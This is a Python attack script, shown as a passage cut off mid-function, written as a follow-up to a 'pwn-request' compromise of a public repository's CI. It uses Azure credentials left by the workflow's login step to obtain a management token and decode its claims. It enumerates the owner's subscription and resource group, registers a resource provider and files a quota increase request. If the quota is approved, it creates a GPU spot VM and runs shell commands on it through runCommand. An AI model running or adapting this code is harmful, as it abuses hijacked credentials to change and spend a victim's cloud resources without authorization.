#!/usr/bin/env python3
"""C211 i120559 probe v11 (mslearn-mlops Azure pwn-request, continuation of i120447/i120316):
- ARM token via azure/login static creds (az account get-access-token)
- full RG resource inventory (names) + pre-clean of ONLY c211-* leftovers with 404 readback
- PHASE B: Microsoft.Quota discovery (subscription scope + per-compute-location lists) for
  LowPriorityCores / standardNVSv4Family
- PHASE C: exactly ONE Microsoft.Quota quota request raising lowPriorityCores to 8 in the first
  region where Standard_NV4as_v4 is offered (fallback to legacy Microsoft.Capacity serviceLimits
  only if the Quota RP write is 403/404/405)
- PHASE D: bounded poll (~8 min) of the quota resource + quotaRequests, recording verbatim state
- PHASE E: ONLY if the approved limit reaches 4 vCPUs -> exactly ONE nonce-tagged SPOT
  Standard_NV4as_v4 VM (vnet+NIC+VM in the existing RG), nvidia-smi device proof via runCommand,
  independent ARM readback, then teardown with 404 / empty-list absence proof
"""
import argparse, base64, json, os, random, re, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse

INTENT = 'i120559r2'
def p(*a): print(*a, flush=True)
def prog(step, **kw):
    try: p('C211_%s_PROGRESS ' % INTENT + json.dumps({'step': step, 't': time.strftime('%FT%TZ', time.gmtime()), **kw})[:3500])
    except Exception as e: p('C211_%s_PROGRESS_ERR ' % INTENT + repr(e))
def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'cmd': cmd, 'rc': r.returncode, 'out': r.stdout[-4000:], 'err': r.stderr[-1500:]}
    except Exception as e: return {'cmd': cmd, 'rc': -1, 'err': repr(e)}
def jget(tok, url):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=90) as r: return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read() or b'{}')
        except Exception: return e.code, {'error': 'http'}
    except Exception as e: return -1, {'error': repr(e)}
def jcall(tok, method, url, body=None, timeout=180):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={'Authorization': 'Bearer ' + tok,
        'User-Agent': 'c211-' + INTENT, 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try: return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception: return r.status, {'raw': raw[:800].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try: b = json.loads(e.read() or b'{}')
        except Exception: b = {'error': 'http'}
        return e.code, b, dict(e.headers)
    except Exception as e: return -1, {'error': repr(e)}, {}

ARM = 'https://management.azure.com'
PREFIXES = ('c211-i120316-', 'c211-i120447-', 'c211-i120559-')
QREG_PREF = ['westeurope', 'northeurope', 'westus2', 'southeastasia', 'canadacentral', 'eastus2', 'westus']

def list_rg_resources(tok, sub, RG):
    st, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    if st != 200: return {'status': st, 'resp': rs}
    items = [{'name': r.get('name'), 'type': r.get('type'), 'loc': r.get('location')} for r in (rs.get('value') or [])]
    ours = [x for x in items if any(str(x['name']).startswith(pre) for pre in PREFIXES)]
    return {'status': 200, 'count': len(items), 'all_names': [x['name'] for x in items], 'ours': ours}

def delete_and_wait(tok, url, check_url):
    sd, rd, _ = jcall(tok, 'DELETE', url)
    last = None
    for i in range(50):
        time.sleep(4)
        last, _ = jget(tok, check_url)
        if last == 404: break
    return {'delete': sd, 'absence': last}

def preclean(tok, sub, RG, R):
    """Delete any leftover resource of OURS (c211-* only) with 404 readback. Never touches non-c211 resources."""
    R['preclean'] = []
    st0, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    items = [{'name': r.get('name'), 'type': (r.get('type') or '')} for r in (rs.get('value') or [])] if st0 == 200 else []
    ours = [x for x in items if any(str(x['name']).startswith(pre) for pre in PREFIXES)]
    prog('preclean_found', status=st0, ours=ours)
    order = ['Microsoft.Compute/virtualMachines', 'Microsoft.Network/networkInterfaces',
             'Microsoft.Network/virtualNetworks', 'Microsoft.Compute/disks']
    for typ in order:
        for x in [y for y in ours if y['type'] == typ]:
            t = typ.split('/')[-1]
            url = f"{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/{typ}/{x['name']}?api-version=" + ('2024-07-01' if t == 'virtualMachines' else '2024-01-01')
            d = delete_and_wait(tok, url, url.split('?')[0] + '?api-version=' + ('2024-07-01' if t == 'virtualMachines' else '2024-01-01'))
            d.update({'name': x['name'], 'type': typ})
            R['preclean'].append(d)
            prog('preclean_deleted', **d)
    st1, rs1 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    left = [r.get('name') for r in (rs1.get('value') or []) if any(str(r.get('name')).startswith(pre) for pre in PREFIXES)] if st1 == 200 else rs1
    R['preclean_after'] = {'status': st1, 'left': left}
    prog('preclean_after', status=st1, left=left)

# ---------------- Microsoft.Quota helpers ----------------
def qname_of(it):
    nm = it.get('name')
    nmv = (nm.get('value') if isinstance(nm, dict) else nm) or ''
    props = it.get('properties') or {}
    pn = props.get('name')
    pv = (pn.get('value') if isinstance(pn, dict) else pn) or ''
    return nmv, pv

def q_sel_item(it):
    nmv, pv = qname_of(it)
    props = it.get('properties') or {}
    return {'id': it.get('id'), 'name': nmv, 'prop_name': pv, 'limit': props.get('limit'),
            'currentValue': props.get('currentValue'), 'resourceType': props.get('resourceType'),
            'unit': props.get('unit'), 'quotaPeriod': props.get('quotaPeriod'),
            'isQuotaApplicable': props.get('isQuotaApplicable'), 'provisioningState': props.get('provisioningState')}

def is_interesting(it):
    nmv, pv = qname_of(it)
    blob = (nmv + ' ' + pv + ' ' + str(it.get('id'))).lower()
    return ('lowpriority' in blob) or ('nvsv4' in blob)

def quota_discover(tok, sub, R):
    Q = {'sub_scope': None, 'locations': {}, 'put': None, 'poll': [], 'requests': None, 'verdict': None}
    R['quota'] = Q
    st, lst = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota/quotas?api-version=2023-02-01')
    items = (lst.get('value') or []) if st == 200 else []
    hits = [q_sel_item(it) for it in items if is_interesting(it)]
    Q['sub_scope'] = {'status': st, 'count': len(items), 'n_hits': len(hits), 'hits': hits[:12],
                      'err': None if st == 200 else (lst.get('error') if isinstance(lst, dict) else lst)}
    prog('quota_sub_scope', status=st, count=len(items), n_hits=len(hits), sample=hits[:4],
         err=Q['sub_scope']['err'])
    for reg in QREG_PREF:
        stl, lstl = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotas?api-version=2023-02-01')
        d = {'status': stl}
        if stl == 200:
            its = lstl.get('value') or []
            d['count'] = len(its)
            d['sel'] = [q_sel_item(it) for it in its if is_interesting(it)]
        else:
            d['err'] = (lstl.get('error') if isinstance(lstl, dict) else lstl)
        Q['locations'][reg] = d
        prog('quota_loc', region=reg, status=stl, count=d.get('count'), sel=d.get('sel'), err=d.get('err'))
        time.sleep(0.4)
    return Q

def quota_put(tok, sub, reg, Q, R):
    loc = Q['locations'].get(reg) or {}
    sel = loc.get('sel') or []
    lp = None
    for it in sel:
        blob = (str(it.get('name')) + ' ' + str(it.get('prop_name'))).lower()
        if 'lowpriority' in blob:
            lp = it; break
    resname = (lp or {}).get('name') or 'lowPriorityCores'
    rtype = (lp or {}).get('resourceType') or 'lowPriority'
    unit = (lp or {}).get('unit') or 'Count'
    body = {'properties': {'limit': 8, 'name': {'value': resname}, 'resourceType': rtype}}
    url = f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotas/{resname}?api-version=2023-02-01'
    st, resp, hdr = jcall(tok, 'PUT', url, body)
    props = (resp.get('properties') or {}) if isinstance(resp, dict) else {}
    rec = {'region': reg, 'resname': resname, 'resourceType': rtype, 'unit': unit,
           'url': url, 'body': body, 'status': st,
           'resp_limit': props.get('limit'), 'resp_state': props.get('provisioningState'),
           'resp_message': (props.get('message') or '')[:800] if isinstance(props.get('message'), str) else props.get('message'),
           'err': (resp.get('error') or {}) if isinstance(resp, dict) and st not in (200, 201, 202) else None,
           'async': hdr.get('Azure-AsyncOperation') or hdr.get('azure-asyncoperation') or hdr.get('Location') or hdr.get('location'),
           'retry_after': hdr.get('Retry-After')}
    Q['put'] = rec
    prog('quota_put', **{k: rec[k] for k in ('region', 'resname', 'resourceType', 'status', 'resp_limit', 'resp_state', 'resp_message', 'err', 'async')})
    # single alternate resourceType retry ONLY on a 400 shape complaint
    if st in (400, 409) and isinstance(rec['err'], dict):
        msg = json.dumps(rec['err']).lower()
        if 'resourcetype' in msg or 'invalid' in msg or 'badrequest' in msg:
            alt = 'dedicated' if rtype != 'dedicated' else 'lowPriority'
            body2 = {'properties': {'limit': 8, 'name': {'value': resname}, 'resourceType': alt}}
            st2, resp2, hdr2 = jcall(tok, 'PUT', url, body2)
            props2 = (resp2.get('properties') or {}) if isinstance(resp2, dict) else {}
            rec2 = {'region': reg, 'resname': resname, 'resourceType': alt, 'url': url, 'body': body2,
                    'status': st2, 'resp_limit': props2.get('limit'), 'resp_state': props2.get('provisioningState'),
                    'resp_message': props2.get('message') if isinstance(props2.get('message'), str) else None,
                    'err': (resp2.get('error') or {}) if isinstance(resp2, dict) and st2 not in (200, 201, 202) else None,
                    'async': hdr2.get('Azure-AsyncOperation') or hdr2.get('Location')}
            Q['put_alt'] = rec2
            prog('quota_put_alt', **{k: rec2[k] for k in ('region', 'resname', 'resourceType', 'status', 'resp_limit', 'resp_state', 'resp_message', 'err')})
    # legacy Microsoft.Capacity fallback ONLY if the Quota RP itself is denied/absent
    if st in (403, 404, 405, 501):
        url2 = f'{ARM}/subscriptions/{sub}/providers/Microsoft.Capacity/resourceProviders/Microsoft.Compute/locations/{reg}/serviceLimits/{resname}?api-version=2020-10-25'
        body3 = {'properties': {'quota': {'limit': 8, 'unit': 'Count'}, 'name': {'value': resname}}}
        st3, resp3, hdr3 = jcall(tok, 'PUT', url2, body3)
        Q['put_legacy'] = {'url': url2, 'status': st3,
                           'resp': json.dumps(resp3)[:1200] if isinstance(resp3, dict) else str(resp3)[:1200],
                           'async': hdr3.get('Azure-AsyncOperation') or hdr3.get('Location')}
        prog('quota_put_legacy', status=st3, resp=Q['put_legacy']['resp'][:600])
    return Q

def quota_poll(tok, sub, reg, Q, R, max_iter=32, sleep_s=15):
    rec = Q.get('put') or {}
    resname = rec.get('resname') or 'lowPriorityCores'
    url = f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotas/{resname}?api-version=2023-02-01'
    final = None
    for i in range(max_iter):
        time.sleep(sleep_s)
        st, g = jget(tok, url)
        props = (g.get('properties') or {}) if isinstance(g, dict) else {}
        cur = props.get('limit'); ps = props.get('provisioningState')
        poll = {'i': i, 't': time.strftime('%FT%TZ', time.gmtime()), 'status': st, 'limit': cur, 'state': ps}
        Q['poll'].append(poll)
        final = {'limit': cur, 'state': ps, 'status': st}
        if i % 4 == 0 or (ps in ('Succeeded', 'Rejected', 'Failed', 'Canceled')):
            prog('quota_poll', i=i, status=st, limit=cur, state=ps)
        if ps in ('Rejected', 'Failed', 'Canceled'):
            break
        if (isinstance(cur, (int, float)) and cur >= 4) and ps in ('Succeeded', 'Accepted', None):
            # one confirmation read after a short settle
            time.sleep(3)
            break
    # async operation readback if ARM gave us one
    async_url = rec.get('async')
    if async_url:
        au = async_url if str(async_url).startswith('http') else ARM + async_url
        sta, ga = jget(tok, au)
        Q['async_final'] = {'status': sta, 'body': json.dumps(ga)[:800]}
        prog('quota_async', status=sta, body=Q['async_final']['body'][:500])
    for u in (f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/providers/Microsoft.Quota/quotaRequests?api-version=2023-02-01',
              f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota/quotaRequests?api-version=2023-02-01'):
        stq, lq = jget(tok, u)
        if stq == 200:
            its = lq.get('value') or []
            Q['requests'] = {'url': u, 'status': stq, 'count': len(its),
                             'first': [{k: (it.get('properties') or {}).get(k) for k in ('provisioningState', 'requestSubmitTime', 'value')} for it in its[:5]]}
            prog('quota_requests', url=u, status=stq, count=len(its), first=Q['requests']['first'])
            break
        else:
            Q['requests'] = {'url': u, 'status': stq, 'err': (lq.get('error') if isinstance(lq, dict) else lq)}
    final_limit = (final or {}).get('limit')
    approved = isinstance(final_limit, (int, float)) and final_limit >= 4 and (final or {}).get('state') not in ('Rejected', 'Failed', 'Canceled')
    Q['verdict'] = {'region': reg, 'resname': resname, 'put_status': rec.get('status'),
                    'final_limit': final_limit, 'final_state': (final or {}).get('state'), 'approved': approved}
    prog('quota_verdict', **Q['verdict'])
    return approved

def deploy_spot(tok, sub, RG, region, sku, sinfo, nonce, R, Q):
    """Exactly ONE nonce-tagged SPOT VM with device proof + independent readback + teardown."""
    marker = R.setdefault('marker', {})
    pre = 'c211-' + INTENT + '-' + nonce
    vnet = pre + '-' + region + '-vnet'; sn = pre + '-' + region + '-subnet'
    nic = pre + '-' + region + '-nic'; vm = pre + '-' + region + '-vm'
    marker.update({'attempted': True, 'nonce': nonce, 'priority': 'Spot', 'region': region, 'sku': sku,
                   'gpu_name': sinfo.get('gpu_name'), 'rg': RG,
                   'names': {'vnet': vnet, 'subnet': sn, 'nic': nic, 'vm': vm, 'region': region}})
    prog('attempt_start', region=region, sku=sku, names=marker['names'])
    steps = {}
    marker['steps'] = steps
    vb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
          'properties': {'addressSpace': {'addressPrefixes': ['10.211.0.0/16']},
                         'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.211.1.0/24'}}]}}
    s1, r1, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01', vb)
    steps['vnet_create'] = {'status': s1, 'err': (r1.get('error') or {}) if isinstance(r1, dict) and s1 not in (200, 201) else None}
    prog('vnet_create', status=s1, err=steps['vnet_create']['err'])
    if s1 not in (200, 201):
        cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R, marker=marker); return False
    settle = None
    for i in range(36):
        stsv, vs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
        props = (vs.get('properties') or {}) if stsv == 200 else {}
        vp = props.get('provisioningState')
        sp = [((s0.get('properties') or {}).get('provisioningState')) for s0 in (props.get('subnets') or [])]
        settle = {'vnet': vp, 'subnets': sp, 'status': stsv}
        if stsv == 200 and vp == 'Succeeded' and all(x == 'Succeeded' for x in sp): break
        time.sleep(5)
    steps['vnet_settle'] = settle
    prog('vnet_settle', settle=settle)
    subnet_id = f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}/subnets/{sn}'
    nb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
          'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
    s2 = None; r2 = None; tries = []
    for i in range(15):
        s2, r2, h2 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nb)
        tries.append({'status': s2, 'retry_after': h2.get('Retry-After'), 'code': ((r2.get('error') or {}).get('code') if isinstance(r2, dict) else None)})
        if s2 in (200, 201): break
        time.sleep(12)
    steps['nic_create'] = {'status': s2, 'tries': tries, 'err': (r2.get('error') or {}) if s2 not in (200, 201) else None}
    prog('nic_create', status=s2, tries=tries)
    if s2 not in (200, 201):
        cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R, marker=marker); return False
    IMAGES = [{'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts', 'version': 'latest'},
              {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'}]
    pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
    s3 = None; r3 = None; vtries = []
    for im in IMAGES:
        vmb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
               'properties': {'hardwareProfile': {'vmSize': sku},
                              'priority': 'Spot', 'evictionPolicy': 'Deallocate', 'billingProfile': {'maxPrice': -1},
                              'storageProfile': {'imageReference': im,
                                                 'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
                              'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
                                            'linuxConfiguration': {'disablePasswordAuthentication': False}},
                              'networkProfile': {'networkInterfaces': [{'id': r2.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
        s3 = None; r3 = None
        for i in range(12):
            s3, r3, h3 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmb, timeout=240)
            vtries.append({'status': s3, 'image': im['sku'], 'retry_after': h3.get('Retry-After'), 'code': ((r3.get('error') or {}).get('code') if isinstance(r3, dict) else None)})
            if s3 in (200, 201): break
            if s3 != 429: break
            time.sleep(15)
        steps['vm_create'] = {'status': s3, 'image': im['sku'], 'tries': vtries,
                              'err': (r3.get('error') or {}) if isinstance(r3, dict) and s3 not in (200, 201) else None}
        prog('vm_create', status=s3, image=im['sku'], tries=vtries, err=steps['vm_create']['err'])
        if s3 in (200, 201): break
        if s3 != 400: break
    if s3 not in (200, 201):
        cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=None, R=R, marker=marker); return False
    ok = False; prov = None; ivstat = None
    for i in range(40):
        time.sleep(12)
        stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
        prov = ((g.get('properties') or {}).get('provisioningState'))
        if prov in ('Succeeded', 'Failed'): ok = prov == 'Succeeded'; break
    marker['provision_state'] = prov; marker['provisioned'] = ok
    steps['provision_state'] = prov
    ig, inst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01')
    ivstat = [{'code': x.get('code'), 'level': x.get('level'), 'message': (x.get('message') or '')[:600]} for x in ((inst.get('statuses') or []) if ig == 200 else [])]
    marker['instance_view_statuses'] = ivstat
    prog('provision', state=prov, ok=ok, ivstat=ivstat, get_status=ig)
    dev_evidence = None
    if ok:
        time.sleep(20)
        script = ("echo ---SMI-L---; (nvidia-smi -L || echo NO_NVIDIA_SMI) 2>&1; "
                  "echo ---SMI-Q---; (nvidia-smi --query-gpu=name,uuid,memory.total --format=csv || echo NO_SMI_QUERY) 2>&1; "
                  "echo ---LSPCI---; (lspci -nn | grep -i -E 'vga|3d|display|nvidia' || echo NO_LSPCI_GPU) 2>&1; "
                  "echo ---MOD---; (lsmod | grep -i nvidia || echo NO_NVIDIA_MODULE) 2>&1; "
                  "echo ---DRM---; (for d in /sys/class/drm/card*/device; do [ -e \"$d\" ] && { echo DEV=$d; cat $d/vendor 2>/dev/null; cat $d/device 2>/dev/null; echo; }; done) 2>&1; "
                  "echo ---HW---; (lshw -C display 2>/dev/null | head -40 || true); echo ---UNAME---; uname -r")
        rc_body = {'commandId': 'RunShellScript', 'script': [script]}
        s4, r4, h4 = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', rc_body)
        steps['runcommand_submit'] = {'status': s4}
        prog('runcommand_submit', status=s4)
        pollurl = h4.get('Azure-AsyncOperation') or h4.get('Location')
        marker['runcommand_pollurl_present'] = bool(pollurl)
        captured = None
        if pollurl:
            for i in range(34):
                time.sleep(8)
                st5, r5 = jget(tok, pollurl if str(pollurl).startswith('http') else ARM + pollurl)
                sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
                if sval in ('Succeeded', 'Failed'): captured = r5; break
        blob = json.dumps(captured or {})
        msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,8000})"', blob)[:8]
        marker['runcommand_messages'] = [m[:6000] for m in msgs]
        marker['runcommand_status'] = ((captured or {}).get('properties', {}) or {}).get('status') if isinstance(captured, dict) else None
        marker['device_signals'] = [x for x in re.findall(r'(GPU-[0-9a-f-]{16,}|10de:[0-9a-f]{4}|Tesla[^"\\]{0,40}|NVIDIA[^"\\]{0,80}|A10[^"\\]{0,20}|V100[^"\\]{0,20}|T4[^"\\]{0,10})', blob)][:20]
        dev_evidence = {'signals': marker['device_signals'], 'runcommand_status': marker['runcommand_status'],
                        'messages': marker['runcommand_messages'][:3]}
        prog('device_proof', **dev_evidence)
    stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
    marker['list_with_marker'] = {'status': stl, 'present': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else lst}
    stget, vget = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
    vprops = (vget.get('properties') or {}) if isinstance(vget, dict) else {}
    marker['vm_get'] = {'status': stget, 'name': vget.get('name'),
                        'size': (vprops.get('hardwareProfile') or {}).get('vmSize'),
                        'priority': vprops.get('priority'), 'evictionPolicy': vprops.get('evictionPolicy'),
                        'tags': vget.get('tags'), 'provisioningState': vprops.get('provisioningState')}
    prog('readback', list=marker['list_with_marker'], vm_get=marker['vm_get'])
    cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=vm, R=R, marker=marker)
    prog('cleanup', cleanup=marker.get('cleanup'))
    marker['device_evidence'] = dev_evidence
    return bool(dev_evidence and dev_evidence.get('signals'))

def main():
    ap = argparse.ArgumentParser(); ap.parse_known_args()
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': INTENT}
    tokr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tokr['out']); tok = td.get('accessToken'); R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '==='))
    except Exception as e:
        R['token_parse_error'] = repr(e)
    R['token_rc'] = tokr['rc']
    prog('token', rc=tokr['rc'], exp=R.get('token_expiresOn'),
         oid=(R.get('token_claims') or {}).get('oid'), appid=(R.get('token_claims') or {}).get('appid'),
         tid=(R.get('token_claims') or {}).get('tid'))
    if not tok:
        R['fatal'] = 'no ARM token'; emit(R); return
    st, subs = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions_status'] = st
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'), 'name': s.get('displayName')}
                          for s in (subs.get('value') or [])]
    sub = (R['subscriptions'][0]['id'] if R['subscriptions'] else os.environ.get('AZURE_SUBSCRIPTION_ID'))
    R['sub'] = sub
    st, rgs = jget(tok, f'{ARM}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01')
    R['rg_status'] = st
    R['rg_names'] = [g['name'] for g in (rgs.get('value') or [])] if st == 200 else rgs
    RG = next((n for n in R['rg_names'] if n.lower().startswith('chriso-sandbox-rg')), None) if isinstance(R['rg_names'], list) else None
    R['rg'] = RG
    prog('enumerated', subs=R['subscriptions'], rgs=R['rg_names'], rg=RG)
    if not RG:
        R['fatal'] = 'no chriso-sandbox-rg'; emit(R); return
    R['rg_resources_before'] = list_rg_resources(tok, sub, RG)
    prog('rg_resources_before', status=R['rg_resources_before'].get('status'),
         count=R['rg_resources_before'].get('count'), names=R['rg_resources_before'].get('all_names'),
         ours=R['rg_resources_before'].get('ours'))
    preclean(tok, sub, RG, R)

    # ---- SKU catalog: which regions offer Standard_NV4as_v4 ----
    sts, cat = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01')
    R['sku_catalog_status'] = sts
    R['sku_catalog_count'] = len(cat.get('value') or []) if sts == 200 else 0
    nv4 = []
    for s in (cat.get('value') or []):
        if s.get('name') != 'Standard_NV4as_v4': continue
        caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
        nv4.append({'locs': [l.lower().replace(' ', '') for l in (s.get('locations') or [])],
                    'family': s.get('family'), 'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs')})
    nv4_regions = []
    for s in nv4:
        for l in s['locs']:
            if l not in nv4_regions: nv4_regions.append(l)
    R['nv4as_v4_regions'] = nv4_regions
    prog('sku_nv4', regions=nv4_regions, entries=len(nv4), gpus=(nv4[0]['gpus'] if nv4 else None))

    # ---- PHASE B0: Microsoft.Quota resource-provider state + ONE bounded registration attempt ----
    stp, provs = jget(tok, f'{ARM}/subscriptions/{sub}/providers?api-version=2021-04-01')
    rp = {}
    for it in ((provs.get('value') or []) if stp == 200 else []):
        ns = it.get('namespace')
        if ns in ('Microsoft.Quota', 'Microsoft.Capacity'):
            rp[ns] = it.get('registrationState')
    R['rp_state'] = {'status': stp, 'quota': rp.get('Microsoft.Quota'), 'capacity': rp.get('Microsoft.Capacity')}
    prog('rp_state', **R['rp_state'])
    stq, reg, hreg = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota/register?api-version=2021-04-01')
    R['rp_register'] = {'status': stq, 'resp': json.dumps(reg)[:900] if isinstance(reg, dict) else str(reg)[:900],
                        'async': hreg.get('Azure-AsyncOperation') or hreg.get('Location')}
    prog('rp_register', **R['rp_register'])
    regpoll = []
    for i in range(8):
        time.sleep(15)
        st1, p1 = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Quota?api-version=2021-04-01')
        state = (p1.get('registrationState') if isinstance(p1, dict) else None)
        regpoll.append({'i': i, 'status': st1, 'state': state})
        if state == 'Registered':
            break
    R['rp_registration_poll'] = regpoll
    prog('rp_registration_poll', tail=regpoll[-3:])

    # ---- PHASE B: quota discovery ----
    Q = quota_discover(tok, sub, R)
    tgt = None
    for reg in QREG_PREF:
        if reg in nv4_regions: tgt = reg; break
    if tgt is None and nv4_regions: tgt = nv4_regions[0]
    R['quota_target_region'] = tgt
    prog('quota_target', region=tgt)

    # ---- PHASE C+D: one quota increase + bounded poll ----
    approved = False
    if not tgt:
        R['quota_skip'] = 'no Standard_NV4as_v4 region in catalog'
    else:
        quota_put(tok, sub, tgt, Q, R)
        try:
            approved = quota_poll(tok, sub, tgt, Q, R, max_iter=20, sleep_s=15)
        except Exception as e:
            prog('quota_poll_error', err=repr(e))

    # ---- PHASE E: exactly ONE spot marker, only when the quota really reached >= 4 vCPU ----
    nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    R['marker'] = {'attempted': False, 'nonce': nonce}
    if approved:
        sinfo = {'sku': 'Standard_NV4as_v4', 'gpu_name': None}
        try:
            deploy_spot(tok, sub, RG, tgt, 'Standard_NV4as_v4', sinfo, nonce, R, Q)
        except Exception as e:
            prog('deploy_error', err=repr(e))
            try:
                # best-effort teardown of our nonce-tagged names in the target region
                pre = 'c211-' + INTENT + '-' + nonce
                cleanup(tok, sub, RG, vnet=pre + '-' + tgt + '-vnet', nic=pre + '-' + tgt + '-nic',
                        vm=pre + '-' + tgt + '-vm', R=R, marker=R.get('marker'))
            except Exception as e2:
                prog('deploy_cleanup_error', err=repr(e2))
    else:
        R['marker']['skipped'] = 'quota_not_approved_ge_4'
        prog('marker_skipped', reason='quota_not_approved_ge_4', verdict=Q.get('verdict'))

    # final safety sweep: delete ANY c211-i120559-* leftovers (and other lanes' c211 leftovers stay untouched)
    preclean(tok, sub, RG, R)
    R['rg_resources_after'] = list_rg_resources(tok, sub, RG)
    prog('rg_resources_after', status=R['rg_resources_after'].get('status'),
         count=R['rg_resources_after'].get('count'), names=R['rg_resources_after'].get('all_names'),
         ours=R['rg_resources_after'].get('ours'))
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    emit(R)

def cleanup(tok, sub, RG, vnet, nic, vm, R, marker=None):
    C = {}
    if vm:
        std, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
        C['vm_delete_status'] = std
        last = None
        for i in range(50):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
            if last == 404: break
        C['vm_absence_status'] = last
    if nic:
        stn, _, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
        C['nic_delete_status'] = stn
        last = None
        for i in range(20):
            time.sleep(4)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
            if last == 404: break
        C['nic_absence_status'] = last
    if vnet:
        sd = None
        for i in range(20):
